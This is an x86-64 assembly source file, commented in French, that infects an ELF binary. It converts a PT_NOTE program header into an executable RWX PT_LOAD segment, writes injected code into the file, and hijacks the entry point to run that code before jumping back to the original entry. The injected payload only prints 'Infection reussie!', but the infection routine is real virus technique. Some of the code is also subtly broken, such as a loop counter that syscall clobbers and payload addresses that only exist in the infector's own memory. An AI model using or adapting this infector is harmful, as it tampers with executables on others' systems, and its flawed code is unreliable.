section .data
filename db "cible", 0                        ; Nom du fichier cible

msg_success db "PT_NOTE modified to PT_LOAD successfully", 10, 0
msg_error   db "Error occurred", 10, 0        ; Message en cas d'erreur

message db "Infection reussie!", 10           ; Message clair pour l'affichage
msg_len equ $ - message                       ; Longueur du message

new_entry dq 0x404000                         ; Nouvelle adresse virtuelle pour e_entry

section .bss
fd resq 1                                     ; Descripteur de fichier
phdr_offset resq 1                            ; Offset de la table des Program Headers
phdr_entry_size resw 1                        ; Taille d'une entrée de Program Header
phdr_number resw 1                            ; Nombre d'entrées dans la table des Program Headers
phdr_buffer resb 56                           ; Buffer pour stocker un Program Header
new_vaddr resq 1                              ; Nouvelle adresse virtuelle pour le segment injecté
original_entry resq 1                         ; Stockage du point d'entrée original

section .text
global _start

_start:
    ; Ouvrir le fichier cible
    mov rax, 2                                ; sys_open (ouvrir un fichier)
    lea rdi, [filename]                       ; Nom du fichier à ouvrir
    mov rsi, 2                                ; O_RDWR (lecture et écriture)
    syscall
    test rax, rax                             ; Vérification de l'erreur
    js error                                  ; En cas d'erreur, sauter vers 'error'
    mov [fd], rax                             ; Stocker le descripteur de fichier

    ; Lire l'en-tête ELF pour récupérer les offsets importants
    call read_elf_header

    ; Sauvegarder l'adresse d'entrée originale
    mov rax, qword [phdr_buffer + 24]         ; Charger e_entry depuis l'en-tête ELF
    mov [original_entry], rax                 ; Sauvegarder l'adresse d'entrée originale

    ; Modifier le segment PT_NOTE en PT_LOAD
    call find_and_modify_pt_note

    ; Injecter le shellcode dans le segment modifié
    call inject_message

    ; Modifier e_entry pour pointer vers le shellcode
    call modify_entry_point

    ; Fermer le fichier
    mov rax, 3                                ; sys_close (fermer un fichier)
    mov rdi, [fd]                             ; Descripteur de fichier
    syscall

    ; Afficher le message de succès
    lea rsi, [msg_success]
    call print_string
    jmp exit

error:
    ; Afficher un message d'erreur
    lea rsi, [msg_error]
    call print_string

exit:
    ; Quitter proprement le programme
    mov rax, 60                               ; sys_exit
    xor rdi, rdi                              ; Code de retour 0
    syscall

; Lire l'en-tête ELF complet pour extraire les offsets utiles
read_elf_header:
    mov rax, 0                                ; sys_read
    mov rdi, [fd]                             ; Descripteur de fichier
    lea rsi, [phdr_buffer]                    ; Buffer pour stocker l'en-tête ELF
    mov rdx, 64                               ; Taille de l'en-tête ELF (64 octets)
    syscall

    mov rax, qword [phdr_buffer + 32]         ; Offset de la table des Program Headers
    mov [phdr_offset], rax
    mov ax, word [phdr_buffer + 54]           ; Taille d'une entrée Program Header
    mov [phdr_entry_size], ax
    mov ax, word [phdr_buffer + 56]           ; Nombre d'entrées Program Header
    mov [phdr_number], ax
    ret

; Trouver et modifier PT_NOTE en PT_LOAD
find_and_modify_pt_note:
    mov rcx, [phdr_number]                    ; Nombre d'entrées Program Header
    mov rbx, [phdr_offset]                    ; Offset de la table Program Header

.loop:
    ; Positionner à l'offset actuel
    mov rax, 8                                ; sys_lseek
    mov rdi, [fd]                             ; Descripteur de fichier
    mov rsi, rbx                              ; Offset actuel
    mov rdx, 0                                ; SEEK_SET (position absolue)
    syscall

    ; Lire l'entrée Program Header
    mov rax, 0                                ; sys_read
    mov rdi, [fd]                             ; Descripteur de fichier
    lea rsi, [phdr_buffer]                    ; Buffer pour lire l'entrée
    mov rdx, 56                               ; Taille d'une entrée Program Header
    syscall

    ; Vérifier si le type est PT_NOTE
    cmp dword [phdr_buffer], 4                ; PT_NOTE = 4
    je .modify                                ; Si oui, modifier cette entrée

    ; Passer à l'entrée suivante
    add rbx, 56                               ; Avancer à l'entrée suivante
    loop .loop                                ; Décrémenter rcx et répéter
    ret

.modify:
    ; Modifier l'entrée PT_NOTE en PT_LOAD
    mov dword [phdr_buffer], 1                ; PT_LOAD
    mov dword [phdr_buffer + 4], 7            ; Permissions RWX (lecture, écriture, exécution)
    mov rax, 0x4000                           ; Offset pour le segment injecté
    mov qword [phdr_buffer + 8], rax          ; p_offset
    mov qword [phdr_buffer + 16], 0x404000    ; p_vaddr (adresse virtuelle)
    mov qword [phdr_buffer + 24], 0x404000    ; p_paddr (adresse physique)
    mov qword [phdr_buffer + 32], 0x100       ; Taille du segment (filesz)
    mov qword [phdr_buffer + 40], 0x100       ; Taille en mémoire (memsz)
    mov qword [new_vaddr], 0x404000

    ; Réécrire le Program Header modifié
    mov rax, 8                                ; sys_lseek
    mov rdi, [fd]
    mov rsi, rbx                              ; Offset de l'entrée modifiée
    mov rdx, 0                                ; SEEK_SET
    syscall

    mov rax, 1                                ; sys_write
    mov rdi, [fd]
    lea rsi, [phdr_buffer]                    ; Entrée modifiée
    mov rdx, 56                               ; Taille d'une entrée Program Header
    syscall
    ret

; Injecter le shellcode à l'offset 0x4000
inject_message:
    mov rax, 8                                ; sys_lseek
    mov rdi, [fd]
    mov rsi, 0x4000                           ; Offset 0x4000
    mov rdx, 0
    syscall

    mov rax, 1                                ; sys_write
    mov rdi, [fd]
    lea rsi, [shellcode]                      ; Shellcode à injecter
    mov rdx, shellcode_len
    syscall
    ret

; Modifier e_entry dans l'en-tête ELF
modify_entry_point:
    mov rax, 8                                ; sys_lseek
    mov rdi, [fd]
    mov rsi, 0x18                             ; Offset e_entry dans l'en-tête ELF
    mov rdx, 0
    syscall

    mov rax, 1                                ; sys_write
    mov rdi, [fd]
    lea rsi, [new_vaddr]                      ; Nouvelle adresse virtuelle
    mov rdx, 8
    syscall
    ret
    

; Afficher une chaîne de caractères
print_string:
    mov rax, 1                                ; sys_write
    mov rdi, 1                                ; stdout
.loop:
    cmp byte [rsi], 0
    je .done
    mov rdx, 1
    syscall
    inc rsi
    jmp .loop
.done:
    ret

section .data
shellcode:
    ; Shellcode pour afficher un message et sauter vers l'entrée originale
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_injected]
    mov rdx, msg_injected_len
    syscall

    jmp qword [original_entry]                ; Retourner à l'entrée originale

msg_injected db "Infection reussie!", 10
msg_injected_len equ $ - msg_injected
shellcode_len equ $ - shellcode

